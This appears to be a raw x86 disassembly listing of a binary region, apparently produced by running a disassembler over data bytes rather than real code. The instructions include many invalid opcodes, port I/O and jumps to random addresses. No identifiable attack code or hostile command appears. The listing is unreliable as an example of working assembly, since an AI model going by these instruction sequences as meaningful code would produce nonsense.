  42fb59:	add    dh,ah
  42fb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb5c:	push   ebx
  42fb5d:	sub    ebx,DWORD PTR [esp+edx*4+0x26fdbb18]
  42fb64:	mov    bl,0xb9
  42fb66:	ror    BYTE PTR [eax],cl
  42fb68:	jbe    0x42fbc4
  42fb6a:	jmp    0x42fb22
  42fb6c:	or     bh,BYTE PTR [ebx+edx*4+0x674e7f73]
  42fb73:	pushf  
  42fb74:	cmp    eax,0x6ca4b170
  42fb79:	imul   ebx,DWORD PTR [edi],0xffffffb5
  42fb7c:	push   ss
  42fb7d:	sbb    DWORD PTR [ecx+0x58f30a5e],eax
  42fb83:	jb     0x42fbdb
  42fb85:	iret   
  42fb86:	icebp  
  42fb87:	xlat   BYTE PTR ds:[ebx]
  42fb88:	(bad)  
  42fb89:	call   0x1aedd269
  42fb8e:	adc    al,BYTE PTR [edx+0x67b5a7e4]
  42fb94:	lock sti 
  42fb96:	add    BYTE PTR [eax+eax*8-0x2fabf7b],ah
  42fb9d:	jnp    0x42fb21
  42fb9f:	(bad)  
  42fba0:	push   esp
  42fba1:	shr    BYTE PTR [ebp-0x42bac101],cl
  42fba7:	xchg   esp,edi
  42fba9:	call   0x3c6e:0x4235057d
  42fbb0:	in     al,0xbb
  42fbb2:	inc    esi
  42fbb3:	push   0x1c
  42fbb5:	jne    0x42fb46
  42fbb7:	retf   
  42fbb8:	jbe    0x42fb4a
  42fbba:	outs   dx,BYTE PTR ds:[esi]
  42fbbb:	pop    es
  42fbbc:	push   ss
  42fbbd:	sbb    al,0x19
  42fbbf:	mov    edx,0x3ba6059d
  42fbc4:	paddd  mm5,QWORD PTR [eax-0x21a2554f]
  42fbcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbcc:	push   edi
  42fbcd:	xor    BYTE PTR [ebx-0x20],cl
  42fbd0:	inc    ecx
  42fbd1:	clc    
  42fbd2:	mov    al,ds:0x7e1c3de5
  42fbd7:	dec    esp
  42fbd8:	xor    eax,0xd9be6c67
  42fbdd:	in     eax,0xd5
  42fbdf:	inc    ebx
  42fbe0:	adc    al,BYTE PTR [esi-0xd20e300]
  42fbe6:	call   0xc8576439
  42fbeb:	out    dx,eax
  42fbec:	add    bl,bh
  42fbee:	out    dx,al
  42fbef:	scas   eax,DWORD PTR es:[edi]
  42fbf0:	int3   
  42fbf1:	in     eax,0xfb
  42fbf3:	ds adc al,0x64
  42fbf6:	rcl    BYTE PTR [edx],0x57
  42fbf9:	jmp    0x76d70fd6
  42fbfe:	aad    0x4e
  42fc00:	pop    ebx
  42fc01:	leave  
  42fc02:	fucomip st,st(4)
  42fc04:	data16 in al,0xb7
  42fc07:	fincstp 
  42fc09:	loop   0x42fc41
  42fc0b:	test   esi,ebp
  42fc0d:	and    BYTE PTR [ecx],al
  42fc0f:	sub    ebp,DWORD PTR [edx-0x5f32c176]
  42fc15:	xchg   ebp,eax
  42fc16:	or     BYTE PTR [esi],ch
  42fc18:	mov    ebx,ebp
  42fc1a:	xchg   ebx,eax
  42fc1b:	push   esp
  42fc1c:	jmp    DWORD PTR [eax+ebx*1]
  42fc1f:	ds mov esp,0x8526d930
  42fc25:	xchg   ecx,eax
  42fc26:	pop    ebp
  42fc27:	add    al,0x3
  42fc29:	call   0xe3ab:0xc6e17823
  42fc30:	mov    ecx,0x4c47030a
  42fc35:	jo     0x42fc97
  42fc37:	and    eax,0x940482bb
  42fc3c:	cmp    dh,BYTE PTR [ebx+0xe841ff]
	...
  42fcb2:	add    BYTE PTR [eax],al
  42fcb4:	sub    dh,dh
  42fcb6:	scas   eax,DWORD PTR es:[edi]
  42fcb7:	fdivr  st,st(7)
  42fcb9:	fnstcw WORD PTR [edi-0xa]
  42fcbc:	cmp    DWORD PTR [esp+ebx*2],0x3ef74fb9
  42fcc3:	(bad)  
  42fcc4:	aaa    
  42fcc5:	clc    
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	cmc    
  42fcc9:	add    BYTE PTR [eax],al
  42fccb:	add    BYTE PTR [ebx-0x70],al
  42fcce:	test   al,0x5b
  42fcd0:	int3   
  42fcd1:	pop    esp
  42fcd2:	xchg   ecx,eax
  42fcd3:	xor    BYTE PTR [eax],0xda
  42fcd6:	sub    dh,BYTE PTR ds:[eax-0x5c]
  42fcda:	idiv   ah
  42fcdc:	mov    al,0xe5
  42fcde:	es icebp 
  42fce0:	rcl    BYTE PTR [ebx+0x3f],1
  42fce3:	(bad)  
  42fce4:	fcom   QWORD PTR [edi+0x39]
  42fce7:	je     0x42fd67
  42fce9:	xchg   edi,eax
  42fcea:	mov    edx,0xd9c5a078
  42fcef:	jmp    0x624aceca
  42fcf4:	jecxz  0x42fc99
  42fcf6:	jmp    0x42fc7d
  42fcf8:	jnp    0x42fca2
  42fcfa:	fst    st(0)
  42fcfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fcfd:	dec    ecx
  42fcfe:	and    bl,BYTE PTR [eax+0x5f]
  42fd01:	adc    esi,DWORD PTR [eax]
  42fd03:	mov    ebp,0xb34503d1
  42fd08:	fcomp  DWORD PTR [edx]
  42fd0a:	call   0x71e5a693
  42fd0f:	ffreep st(3)
  42fd11:	push   ss
  42fd12:	sbb    DWORD PTR [ecx],ecx
  42fd14:	icebp  
  42fd15:	std    
  42fd16:	and    BYTE PTR [ebx+0x29],dl
  42fd19:	lea    esi,[edi+0x53869299]
  42fd1f:	cs and eax,edi
  42fd22:	or     al,0xb5
  42fd24:	dec    eax
  42fd25:	cmp    dl,ch
  42fd27:	popf   
  42fd28:	stos   DWORD PTR es:[edi],eax
  42fd29:	aam    0x69
  42fd2b:	shl    BYTE PTR [ebp+eax*4-0x4c],1
  42fd2f:	inc    edx
  42fd30:	fwait
  42fd31:	cmp    edi,DWORD PTR [ecx]
  42fd33:	jne    0x42fd26
  42fd35:	dec    ebp
  42fd36:	xor    al,0xd9
  42fd38:	sub    DWORD PTR [edi+0x5],eax
  42fd3b:	and    al,0xf4
  42fd3d:	stc    
  42fd3e:	dec    eax
  42fd3f:	dec    ebp
  42fd40:	dec    ebx
  42fd41:	xchg   ecx,eax
  42fd42:	or     ecx,DWORD PTR [ebx-0x3e]
  42fd45:	or     ah,dh
  42fd47:	lods   al,BYTE PTR ds:[esi]
  42fd48:	in     eax,0x33
  42fd4a:	loop   0x42fd07
  42fd4c:	pop    ebp
  42fd4d:	or     cl,BYTE PTR [ebp+0x0]
  42fd50:	sbb    esi,esp
  42fd52:	lea    eax,[ecx+0x21]
  42fd55:	mov    cl,0x9f
  42fd57:	cmovae eax,DWORD PTR [eax-0xd73dd80]
  42fd5e:	add    al,0x1c
  42fd60:	add    BYTE PTR [eax+0x27],0xd8
  42fd64:	jns    0x42fd31
  42fd66:	nop
  42fd67:	mov    bl,bl
  42fd69:	mov    ds:0x16168f8a,al
  42fd6e:	fstp   TBYTE PTR [eax+0x6e4818ff]
  42fd74:	jecxz  0x42fd6c
  42fd76:	outs   dx,BYTE PTR ds:[esi]
  42fd77:	sub    edi,DWORD PTR [esi+esi*1+0x55]
  42fd7b:	pop    esi
  42fd7c:	aas    
  42fd7d:	je     0x42fdf7
  42fd7f:	lods   al,BYTE PTR ds:[esi]
  42fd80:	jnp    0x42fd6f
  42fd82:	rol    BYTE PTR [edx-0x57],0xa6
  42fd86:	fcomp  DWORD PTR [esi-0x35b8410]
  42fd8c:	adc    eax,0x59ab53d1
  42fd91:	pop    esp
  42fd92:	out    dx,al
  42fd93:	aam    0xb2
  42fd95:	cmp    DWORD PTR [edx+0x38aa2d12],edi
  42fd9b:	cmp    DWORD PTR [ebx+0x57cbfee6],esp
  42fda1:	xor    BYTE PTR [eax+0x1fe5d39c],dh
  42fda7:	inc    ebx
  42fda8:	scas   al,BYTE PTR es:[edi]
  42fda9:	scas   eax,DWORD PTR es:[edi]
  42fdaa:	ja     0x42fd5d
  42fdac:	and    BYTE PTR ds:0xf54f5527,dl
  42fdb2:	in     al,dx
  42fdb3:	sub    al,0x2
  42fdb5:	pop    ds
  42fdb6:	iret   
  42fdb7:	test   al,0x3e
  42fdb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fdba:	mov    cl,0xaf
  42fdbc:	mov    ebp,0x14b5dadf
	...
  42fe31:	add    BYTE PTR [eax],al
  42fe33:	add    bl,al
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	fldcw  WORD PTR [ecx-0x6d39f10]
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	cmc    
  42fe49:	add    BYTE PTR [eax],al
  42fe4b:	add    BYTE PTR [eax+esi*4],ah
  42fe4e:	mov    bh,0x72
  42fe50:	data16 jnp 0x42fec9
  42fe53:	imul   esp,DWORD PTR [edi-0x76],0xffffffa2
  42fe57:	call   0xe409a64f
  42fe5c:	cmp    bh,BYTE PTR [edx+0x7a]
  42fe5f:	(bad)  [esi]
  42fe61:	mov    ss,WORD PTR [eax]
  42fe63:	iret   
  42fe64:	xchg   BYTE PTR [ecx+0x23],ah
  42fe67:	pop    es
  42fe68:	fsubr  DWORD PTR [ebx+0x77eaef3e]
  42fe6e:	sbb    BYTE PTR [edi-0x1bd9cf0],dh
  42fe74:	fwait
  42fe75:	xchg   esi,eax
  42fe76:	add    esi,DWORD PTR ds:[edi-0x4d]
  42fe7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe7b:	cli    
  42fe7c:	dec    esp
  42fe7d:	adc    eax,0x7c58e41c
  42fe82:	fs push esi
  42fe84:	gs retf 0x585
  42fe88:	out    dx,al
  42fe89:	psrlq  mm1,QWORD PTR [edi+0x78]
  42fe8d:	or     eax,0x54d39860
  42fe92:	xor    eax,0x3cf93514
  42fe97:	and    esi,DWORD PTR [esi]
  42fe99:	ins    BYTE PTR es:[edi],dx
  42fe9a:	or     al,0x21
  42fe9c:	imul   DWORD PTR [edi-0x7665f88]
  42fea2:	mov    dh,0x51
  42fea4:	mov    cl,0xaf
  42fea6:	cmp    bl,BYTE PTR [ebx+0x3e]
  42fea9:	(bad)  
  42feaa:	out    0xa,al
  42feac:	pushf  
  42fead:	xchg   esp,eax
  42feae:	mov    ebp,0x788a053d
  42feb3:	push   edx
  42feb4:	lea    edi,[ebx+0x8]
  42feb7:	push   ds
  42feb8:	jnp    0x42ff01
  42feba:	push   ds
  42febb:	lea    edi,[ecx]
  42febd:	aad    0x1b
  42febf:	dec    esp
  42fec0:	xchg   edx,eax
  42fec1:	imul   esi,ebp,0xffffff98
  42fec4:	dec    eax
  42fec5:	cmp    BYTE PTR ds:0xeb55a736,ah
  42fecb:	fidiv  WORD PTR [ebx+0x24]
  42fece:	cmp    bh,cl
  42fed0:	xor    cl,BYTE PTR [ebx+0x33c048e0]
  42fed6:	and    eax,0x77e93a1d
  42fedb:	mov    al,ds:0xc480e5b4
  42fee0:	push   esi
  42fee1:	mov    es,ecx
  42fee3:	and    BYTE PTR [esi-0x6e],bl
  42fee6:	jns    0x42fee3
  42fee8:	push   cs
  42fee9:	icebp  
  42feea:	imul   edi,DWORD PTR [eax+0x43c97ad0],0x5a
  42fef1:	scas   al,BYTE PTR es:[edi]
  42fef2:	pop    es
  42fef3:	sbb    bl,bl
  42fef5:	fwait
  42fef6:	out    dx,eax
  42fef7:	retf   
  42fef8:	call   0x9397c6ee
  42fefd:	shr    DWORD PTR [eax+0x7a],0xd3
  42ff01:	or     ebx,DWORD PTR [eax-0x59]
  42ff04:	(bad)  
  42ff05:	outs   dx,DWORD PTR ds:[esi]
  42ff06:	jb     0x42ff27
  42ff08:	inc    eax
  42ff09:	iret   
  42ff0a:	out    dx,al
  42ff0b:	mov    cl,0x4d
  42ff0d:	jnp    0x42ff75
  42ff0f:	rcl    edi,cl
  42ff11:	cmp    ebp,eax
  42ff13:	mov    edx,0x3971f277
  42ff18:	push   ecx
  42ff19:	mov    edx,0x28099fb9
  42ff1e:	dec    edx
  42ff1f:	cld    
  42ff20:	dec    eax
  42ff21:	push   esp
  42ff22:	xchg   edx,eax
  42ff23:	ret    0xb179
  42ff26:	push   ecx
  42ff27:	rcr    BYTE PTR [edx+0x62],cl
  42ff2a:	mov    eax,ds:0x2e6abc5
  42ff2f:	and    BYTE PTR [edx+0x2b7293c9],al
  42ff35:	push   edx
  42ff36:	xchg   esp,eax
  42ff37:	test   BYTE PTR [ecx+0x67],0x9
  42ff3b:	mov    ah,BYTE PTR ds:0xa8f86c95
	...
  42ffb1:	add    BYTE PTR [eax],al
  42ffb3:	add    BYTE PTR [edx],dl
  42ffb5:	ds int 0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx-0x58768016]
  42ffc1:	lods   eax,DWORD PTR ds:[esi]
  42ffc2:	cs pop edx
  42ffc4:	and    edx,edi
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	cmc    
  42ffc9:	add    BYTE PTR [eax],al
  42ffcb:	add    BYTE PTR [eax],bl
  42ffcd:	or     BYTE PTR [ebx+eax*1+0x7d],0xbc
  42ffd2:	jb     0x42ffcf
  42ffd4:	shr    DWORD PTR [ecx+0x68a59b1],cl
  42ffda:	arpl   WORD PTR [ecx],bx
  42ffdc:	mov    ebp,DWORD PTR [ecx-0x72]
  42ffdf:	fsub   st,st(4)
  42ffe1:	gs (bad) 
  42ffe3:	cmc    
  42ffe4:	fcom   QWORD PTR [ecx+0x61]
  42ffe7:	mov    ebx,0x1fa4903a
  42ffec:	cld    
  42ffed:	adc    al,0xb9
  42ffef:	jne    0x42ff9a
  42fff1:	cdq    
  42fff2:	xor    eax,0xa757e347
  42fff7:	and    eax,0x69c4e27c
  42fffc:	mov    edi,0x8b7ecb
  430001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430002:	push   ecx
  430003:	cmp    BYTE PTR [edx],dl
  430005:	in     al,0xc4
  430007:	dec    edi
  430008:	fisttp QWORD PTR [edi]
  43000a:	add    eax,0x5b75fb70
  43000f:	push   es
  430010:	addr16 xchg ebp,eax
  430012:	bound  ebp,QWORD PTR [eax+0x21]
  430015:	fbstp  TBYTE PTR [edx]
  430017:	ret    0xebc6
  43001a:	xchg   ebp,eax
  43001b:	xor    al,0x34
  43001d:	mov    fs,WORD PTR ds:[edi+edi*8]
  430021:	push   ss
  430022:	or     ebx,eax
  430024:	mov    al,ds:0xcd8e33f2
  430029:	mov    BYTE PTR [edi+edi*1+0x41],bl
  43002d:	loope  0x43009d
  43002f:	stc    
  430030:	push   esp
  430031:	adc    BYTE PTR [edi],al
  430033:	(bad)  [eax-0xc]
  430036:	mov    DWORD PTR [ecx],esi
  430038:	sub    eax,0xc118cdcf
  43003d:	cmp    al,ah
  43003f:	sbb    DWORD PTR [ecx],0x31
  430042:	aaa    
  430043:	mov    dl,al
  430045:	push   es
  430046:	and    al,0x10
  430048:	push   cs
  430049:	sbb    ah,bl
  43004b:	mov    eax,ds:0x6ea10ab5
  430050:	mov    al,BYTE PTR [eax]
  430052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430053:	aam    0x7e
  430055:	fs nop
  430057:	je     0x430068
  430059:	or     DWORD PTR [esi-0x47b8c522],0xe59780b3
  430063:	ds (bad) 
  430065:	or     eax,0xf3f90b12
  43006a:	sbb    al,0x25
  43006c:	sar    DWORD PTR [eax],1
  43006e:	ins    DWORD PTR es:[edi],dx
  43006f:	pop    esp
  430070:	xchg   edi,eax
  430071:	repz lea ebx,[edx+0xafd594d]
  430078:	xchg   BYTE PTR ds:0x2bee72c0,dl
  43007e:	call   0xb529:0x2e2790ae
  430085:	cli    
  430086:	cwde   
  430087:	scas   al,BYTE PTR es:[edi]
  430088:	mov    ?,WORD PTR [eax-0x5e]
  43008b:	out    0x52,al
  43008d:	daa    
  43008e:	mov    ah,0x65
  430090:	mov    ds:0x301be54,eax
  430095:	into   
  430096:	and    edi,DWORD PTR [edx+0x4c]
  430099:	hlt    
  43009a:	add    eax,DWORD PTR [edi]
  43009c:	shl    BYTE PTR [edx+edi*8-0x7fcba49f],0x7b
  4300a4:	mov    dl,0x7b
  4300a6:	mov    gs:0xa87b55e4,al
  4300ac:	jae    0x430055
  4300ae:	inc    ebx
  4300af:	out    0x5e,eax
  4300b1:	scas   eax,DWORD PTR es:[edi]
  4300b2:	faddp  st(4),st
  4300b4:	sub    eax,0x4b14a171
  4300b9:	sbb    al,0x6e
  4300bb:	push   esi
  4300bc:	xchg   edx,eax
  4300bd:	je     0x43005a
  4300bf:	jl     0x4300a1
	...
  430131:	add    BYTE PTR [eax],al
  430133:	add    BYTE PTR [edx+0x26],bl
  430136:	jecxz  0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0x7462:0xacb8a608
  430144:	push   ss
  430145:	sti    
  430146:	add    DWORD PTR [eax],eax
  430148:	cmc    
  430149:	add    BYTE PTR [eax],al
  43014b:	add    ch,ah
  43014d:	mov    BYTE PTR [ebp+0x525ae408],dl
  430153:	hlt    
  430154:	adc    ecx,DWORD PTR [esi+edi*2-0x71]
  430158:	mov    ah,dl
  43015a:	cdq    
  43015b:	jno    0x4300e7
  43015d:	inc    ebp
  43015e:	pop    esp
  43015f:	in     eax,0x79
  430161:	ins    BYTE PTR es:[edi],dx
  430162:	pop    es
  430163:	iret   
  430164:	mov    ah,0xe
  430166:	icebp  
  430167:	adc    edi,edi
  430169:	test   eax,0x8362a0c5
  43016f:	pop    eax
  430170:	loopne 0x4301bc
  430172:	jecxz  0x43013e
  430174:	sub    DWORD PTR [edx+0x3cc72314],esi
  43017a:	aad    0x44
  43017c:	aad    0xde
  43017e:	lods   al,BYTE PTR ds:[esi]
  43017f:	add    al,0xae
  430181:	fldcw  WORD PTR [ecx+edi*8]
  430184:	or     bh,BYTE PTR [ebp-0x19608823]
  43018a:	mov    bh,BYTE PTR [edx]
  43018c:	leave  
  43018d:	sti    
  43018e:	xor    esp,DWORD PTR [eax+0x1]
  430191:	call   0x43aa0ab7
  430196:	xchg   ebx,eax
  430197:	std    
  430198:	xor    eax,0xbd8c3eb3
  43019d:	and    bh,al
  43019f:	mov    al,0x9c
  4301a1:	pop    ds
  4301a2:	pop    ss
  4301a3:	push   ecx
  4301a4:	imul   ebp,DWORD PTR [eax],0x20
  4301a7:	mov    ebp,0xbb5f04bf
  4301ac:	mov    esp,0xee7f00fd
  4301b1:	sbb    dl,BYTE PTR [ecx+0x3b5e0304]
  4301b7:	pop    ebp
  4301b8:	sbb    ebx,edx
  4301ba:	lock (bad) 
  4301bc:	jle    0x4301d6
  4301be:	and    al,0x6a
  4301c0:	inc    ebp
  4301c1:	sbb    al,0x2b
  4301c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4301c4:	lock enter 0x887b,0xba
  4301c9:	hlt    
  4301ca:	push   esi
  4301cb:	xor    BYTE PTR [ebp+ebp*4+0x3],bl
  4301cf:	ss cmp eax,0xb030500e
  4301d5:	(bad)  
  4301d6:	(bad)  [eax+0x75464030]
  4301dc:	mov    al,0xd2
  4301de:	arpl   WORD PTR [edi-0x1462b718],cx
  4301e4:	retf   
  4301e5:	stos   DWORD PTR es:[edi],eax
  4301e6:	push   ebx
  4301e7:	dec    ecx
  4301e8:	arpl   WORD PTR [ecx+0x1b],si
  4301eb:	out    0xf1,eax
  4301ed:	xchg   edi,eax
  4301ee:	outs   dx,BYTE PTR ds:[esi]
  4301ef:	test   eax,0xc982f834
  4301f4:	push   eax
  4301f5:	sbb    al,0x21
  4301f7:	xchg   esi,eax
  4301f8:	fs sub al,0x73
  4301fb:	dec    eax
  4301fc:	dec    eax
  4301fd:	(bad)  
  4301fe:	lahf   
  4301ff:	int3   
  430200:	push   ecx
  430201:	mov    eax,0x2368d178
  430206:	stos   BYTE PTR es:[edi],al
  430207:	gs out dx,al
  430209:	ss dec edx
  43020b:	mov    bl,0x8b
  43020d:	jnp    0x430236
  43020f:	xchg   DWORD PTR [esi-0x7136a6ca],edx
  430215:	dec    esp
  430216:	cmp    al,0xea
  430218:	ror    BYTE PTR [edx],0xf7
  43021b:	push   esi
  43021c:	mov    ds:0x392948b9,al
  430221:	or     eax,0x211963e
  430226:	jnp    0x430223
  430228:	jle    0x43025e
  43022a:	and    ch,BYTE PTR [eax+0x6f]
  43022d:	cmp    ebx,DWORD PTR cs:[ecx+0x4189ce35]
  430234:	adc    al,0x8e
  430236:	out    dx,eax
  430237:	or     BYTE PTR [edi+0x40d26ba4],dh
  43023d:	popf   
  43023e:	enter  0xe338,0x0
	...
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	mov    ebp,0xaf8a081a
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	cmc    
  4302c1:	jl     0x430245
  4302c3:	xor    cl,BYTE PTR [ebx]
  4302c5:	cld    
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	cmc    
  4302c9:	add    BYTE PTR [eax],al
  4302cb:	add    BYTE PTR [ebx+0x6a],bl
  4302ce:	ja     0x430261
  4302d0:	jle    0x43026d
  4302d2:	xor    BYTE PTR [ecx],0x4a
  4302d5:	mov    ebp,ecx
  4302d7:	scas   eax,DWORD PTR es:[edi]
  4302d8:	xchg   ebp,eax
  4302d9:	sbb    edi,DWORD PTR [edx-0x3f]
  4302dc:	xor    BYTE PTR [esi+eax*1-0x5610c5bf],bl
  4302e3:	or     al,0x1c
  4302e5:	mov    WORD PTR [edi+0x46],ds
  4302e8:	outs   dx,BYTE PTR ds:[esi]
  4302e9:	(bad)  [ebx+eax*2+0x369d36e3]
  4302f0:	aad    0xd9
  4302f2:	xchg   DWORD PTR [edi],edi
  4302f4:	jp     0x430338
  4302f6:	dec    eax
  4302f7:	xlat   BYTE PTR ds:[ebx]
  4302f8:	cmp    edx,DWORD PTR [ebp+0x51aaef60]
  4302fe:	inc    esp
  430300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430301:	or     DWORD PTR [eax+0x21],0xffffff9a
  430305:	fstp   TBYTE PTR [ebx]
  430307:	shr    DWORD PTR [edx+0x6b],1
  43030a:	mov    dl,0xf6
  43030c:	mov    cl,BYTE PTR [eax]
  43030e:	lds    ecx,FWORD PTR [edi+0x2d]
  430311:	fild   QWORD PTR [edi+0x690dee79]
  430317:	mov    ah,0xb6
  430319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43031a:	jb     0x4302b8
  43031c:	mov    esi,0x44e366fd
  430321:	ins    DWORD PTR es:[edi],dx
  430322:	addr16 sti 
  430324:	fsubp  st(5),st
  430326:	push   0x3b
  430328:	repz shl DWORD PTR [eax-0x30],0xbb
  43032d:	fnstenv [esi-0x4f]
  430330:	loop   0x430355
  430332:	inc    eax
  430333:	mov    cl,0xfb
  430335:	fs pop ebx
  430337:	jbe    0x430322
  430339:	xor    dl,cl
  43033b:	cdq    
  43033c:	mov    ebx,0x9edb5610
  430341:	or     dl,ch
  430343:	outs   dx,DWORD PTR ds:[esi]
  430344:	cs pop ebp
  430346:	mov    esi,0xfedb9418
  43034b:	jmp    0x4302f5
  43034d:	mov    ebx,0xc31d26f2
  430352:	jne    0x4302fc
  430354:	ja     0x4302df
  430356:	push   ds
  430357:	mov    ?,WORD PTR [eax+0x768f6b15]
  43035d:	mov    cl,BYTE PTR [ebp+0x6224409b]
  430363:	adc    ebp,DWORD PTR [eax+0x44048dcd]
  430369:	jl     0x4303ae
  43036b:	cld    
  43036c:	pop    es
  43036d:	pop    esp
  43036e:	dec    edi
  43036f:	bound  ebp,QWORD PTR [edi]
  430371:	dec    sp
  430373:	adc    ah,bl
  430375:	int    0xa7
  430377:	arpl   WORD PTR [ebp+0x2acb3e08],cx
  43037d:	jp     0x43033a
  43037f:	ja     0x4303cf
  430381:	mov    ebx,0x4ce7b2e7
  430386:	push   0x8a9bcd51
  43038b:	jne    0x430310
  43038d:	cmp    eax,0x4a97daeb
  430392:	push   ebp
  430393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430394:	lds    esp,FWORD PTR [ebp-0x25e89c95]
  43039a:	arpl   sp,dx
  43039c:	mov    ebx,0x9d2b0bb9
  4303a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4303a2:	ja     0x430400
  4303a4:	push   esp
  4303a5:	iret   
  4303a6:	(bad)  
  4303a7:	mul    ecx
  4303a9:	xchg   esi,eax
  4303aa:	jae    0x430334
  4303ac:	jb     0x430387
  4303ae:	loope  0x430393
  4303b0:	push   ss
  4303b1:	ficom  WORD PTR [edi]
  4303b3:	in     al,0xa
  4303b5:	retf   
  4303b6:	in     eax,0xbd
  4303b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4303b9:	jg     0x430357
  4303bb:	pop    eax
  4303bc:	(bad)  
  4303bd:	xlat   BYTE PTR ds:[ebx]
  4303be:	arpl   WORD PTR ds:0xce,di
	...
  430434:	aaa    
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfd00:0xd69fbe60
  430446:	add    DWORD PTR [eax],eax
  430448:	cmc    
  430449:	add    BYTE PTR [eax],al
  43044b:	add    BYTE PTR [eax-0x28b194c3],al
  430451:	jl     0x430475
  430453:	sub    eax,DWORD PTR [edx+0x34]
  430456:	mov    DWORD PTR [edi-0x61],esi
  430459:	mov    dh,0x17
  43045b:	in     al,0x90
  43045d:	inc    edx
  43045e:	jp     0x430403
  430460:	xchg   esp,eax
  430461:	adc    eax,0x1af03d05
  430466:	ret    0xb421
  430469:	ds push edx
  43046b:	test   eax,0x355f852a
  430470:	or     DWORD PTR [ebp+0xc],ecx
  430473:	aas    
  430474:	mov    ebx,ss
  430476:	jle    0x4304d5
  430478:	(bad)  
  430479:	mov    dh,BYTE PTR [edx]
  43047b:	ss js  0x430447
  43047e:	dec    esp
  43047f:	cs jmp 0x4498:0xc9244e1f
  430487:	jecxz  0x430500
  430489:	ins    BYTE PTR es:[edi],dx
  43048a:	enter  0x5139,0xe4
  43048e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43048f:	push   esi
  430490:	jmp    0xfeda:0xcaf417a9
  430497:	xor    al,0x29
  430499:	(bad)  
  43049a:	popa   
  43049b:	outs   dx,DWORD PTR ds:[esi]
  43049c:	lds    ecx,FWORD PTR [ebp-0x5ebcb594]
  4304a2:	dec    ecx
  4304a3:	cdq    
  4304a4:	ja     0x4304e2
  4304a6:	xchg   cl,ch
  4304a8:	stos   BYTE PTR es:[edi],al
  4304a9:	lock jmp 0x64bbe823
  4304af:	jns    0x430530
  4304b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4304b2:	imul   esi,esi,0x6c
  4304b5:	fbstp  TBYTE PTR [ebx]
  4304b7:	pop    eax
  4304b8:	lahf   
  4304b9:	ja     0x4304b3
  4304bb:	dec    edx
  4304bc:	cmp    eax,ebp
  4304be:	lock pop ss
  4304c0:	ror    BYTE PTR ds:[edi],cl
  4304c3:	fcom   QWORD PTR [ebx]
  4304c5:	leave  
  4304c6:	add    DWORD PTR [esi+ebx*2],ebx
  4304c9:	ins    BYTE PTR es:[edi],dx
  4304ca:	xchg   dl,dh
  4304cc:	pop    ebx
  4304cd:	jo     0x430470
  4304cf:	mov    bl,BYTE PTR [eax+0x67]
  4304d2:	push   ebx
  4304d3:	push   ebx
  4304d4:	pop    ebx
  4304d5:	sub    ah,ch
  4304d7:	lahf   
  4304d8:	imul   edi,DWORD PTR [ebp-0x6],0xd5fc9970
  4304df:	out    dx,al
  4304e0:	call   0xcb5d:0x681628c9
  4304e7:	not    BYTE PTR ds:0xb0c79b3
  4304ed:	outs   dx,DWORD PTR ds:[esi]
  4304ee:	les    ecx,FWORD PTR [ebx]
  4304f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4304f1:	pop    ebx
  4304f2:	cmp    eax,0x9478af7a
  4304f7:	mov    edi,0x6680e765
  4304fc:	std    
  4304fd:	sub    ebp,DWORD PTR ds:0xcbf36b9e
  430503:	adc    BYTE PTR [ebx+ebx*2-0x70],dl
  430507:	pop    edi
  430508:	mov    esi,0x768864bd
  43050d:	jmp    0x43054f
  43050f:	xchg   esp,eax
  430510:	fwait
  430511:	inc    ebp
  430512:	out    dx,eax
  430513:	mov    WORD PTR ds:0x55d96b0,?
  430519:	or     esp,DWORD PTR [ecx]
  43051b:	aas    
  43051c:	popa   
  43051d:	mov    cs,eax
  43051f:	ret    
  430520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430521:	cmp    al,0x5d
  430523:	sub    eax,0xaf94442a
  430528:	mov    ebp,0x8bb881
  43052d:	in     eax,0x40
  43052f:	dec    ecx
  430530:	cmp    al,0xc2
  430532:	sti    
  430533:	sub    dh,dh
  430535:	out    dx,al
  430536:	outs   dx,BYTE PTR ds:[esi]
  430537:	inc    eax
  430538:	and    ebp,DWORD PTR [eax+0x25628870]
  43053e:	out    0x71,eax
  430540:	jmp    0x430545
	...
  4305b1:	add    BYTE PTR [eax],al
  4305b3:	add    BYTE PTR [esi],bh
  4305b5:	push   esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x14]
  4305c1:	aad    0xf7
  4305c3:	(bad)  
